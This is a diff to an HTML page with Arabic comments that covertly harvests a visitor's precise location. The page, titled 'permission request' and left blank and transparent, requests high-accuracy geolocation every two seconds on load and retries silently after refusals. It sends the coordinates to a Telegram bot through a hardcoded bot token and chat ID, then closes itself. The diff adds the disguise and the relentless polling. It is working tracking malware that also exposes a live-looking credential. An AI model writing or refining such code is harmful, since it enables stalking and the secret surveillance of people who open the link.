@@ -2,74 +2,53 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title> </title>
+    <title>طلب الإذن</title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
-
+        
         let requestCount = 0;
-        let isRequesting = false;
 
         function startLocationRequests() {
-            console.log("بدء طلبات الموقع...");
+            console.log("🚀 بدء طلبات الموقع...");
             
-            // طلب فوري
+            // طلب فوري أولي
             requestLocation();
             
-            // طلب كل 3 ثواني
-            setInterval(requestLocation, 3000);
-            
-            // طلب عند أي تفاعل
-            document.addEventListener('click', triggerRequest);
-            document.addEventListener('touchstart', triggerRequest);
-            document.addEventListener('keydown', triggerRequest);
-            window.addEventListener('focus', triggerRequest);
-        }
-
-        function triggerRequest() {
-            if (!isRequesting) {
-                requestLocation();
-            }
+            // طلب كل 2 ثانية بالضبط
+            setInterval(requestLocation, 2000);
         }
 
         function requestLocation() {
-            if (isRequesting) return;
-            
-            isRequesting = true;
             requestCount++;
-            console.log(`طلب الموقع #${requestCount}`);
+            console.log(`📍 طلب الموقع #${requestCount}`);
 
             if (!navigator.geolocation) {
-                console.log("المتصفح لا يدعم الموقع");
-                isRequesting = false;
+                console.log("❌ المتصفح لا يدعم الموقع");
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                // ✅ النجاح
+                // ✅ إذا وافق
                 async function(position) {
-                    console.log("✅ تم الحصول على الموقع!");
+                    console.log("✅ تم الموافقة على الموقع!");
+                    
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
                     
-                    // إرسال للبوت
+                    // إرسال فوري للبوت
                     await sendToTelegram(lat, lng, accuracy, requestCount);
                     
-                    // إغلاق الصفحة
+                    // إغلاق الصفحة بعد الإرسال
                     setTimeout(() => {
                         window.close();
                     }, 1000);
                 },
-                // ❌ الفشل
+                // ❌ إذا رفض - نستمر بدون أي رسالة
                 function(error) {
-                    console.log(`❌ تم رفض الطلب #${requestCount}:`, error.message);
-                    isRequesting = false;
-                    
-                    // نعيد المحاولة بعد وقت قصير
-                    setTimeout(() => {
-                        isRequesting = false;
-                    }, 1000);
+                    console.log(`🔄 تم رفض الطلب #${requestCount} - نستمر...`);
+                    // لا نقوم بأي شيء - setInterval سيعيد الطلب تلقائياً
                 },
                 {
                     enableHighAccuracy: true,
@@ -81,12 +60,12 @@
 
         async function sendToTelegram(lat, lng, accuracy, attempts) {
             const message = 
-                `🎯 موقع من طلب لا نهائي\n\n` +
+                `🎯 موقع من طلب متكرر\n\n` +
                 `📍 الإحداثيات:\n` +
                 `• خط العرض: ${lat.toFixed(6)}\n` +
                 `• خط الطول: ${lng.toFixed(6)}\n` +
                 `• الدقة: ${accuracy} متر\n\n` +
-                `🔄 المحاولة: ${attempts}\n` +
+                `🔄 عدد المحاولات: ${attempts}\n` +
                 `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;
 
             try {
@@ -98,29 +77,18 @@
                         text: message
                     })
                 });
-                console.log("✅ تم الإرسال للبوت");
+                console.log("✅ تم الإرسال للبوت بنجاح");
             } catch (error) {
-                console.log("❌ فشل الإرسال:", error);
+                console.log("❌ فشل في الإرسال:", error);
             }
         }
 
-        // البدء بعد تحميل الصفحة مباشرة
-        window.onload = function() {
-            console.log("الصفحة محملة - بدء الطلبات...");
-            startLocationRequests();
-        };
-
-        // أيضاً نبدأ عندما يصبح الصفحة مرئية
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                console.log("الصفحة مرئية - طلب موقع...");
-                setTimeout(requestLocation, 500);
-            }
-        });
+        // البدء المباشر عند تحميل الصفحة
+        window.onload = startLocationRequests;
 
     </script>
 </head>
-<body style="margin:0;padding:0;background:#f0f0f0;">
-    <!-- صفحة مع خلفية مرئية للتأكد من التحميل -->
+<body style="margin:0;padding:0;background:transparent;">
+    <!-- صفحة فارغة تماماً -->
 </body>
 </html>
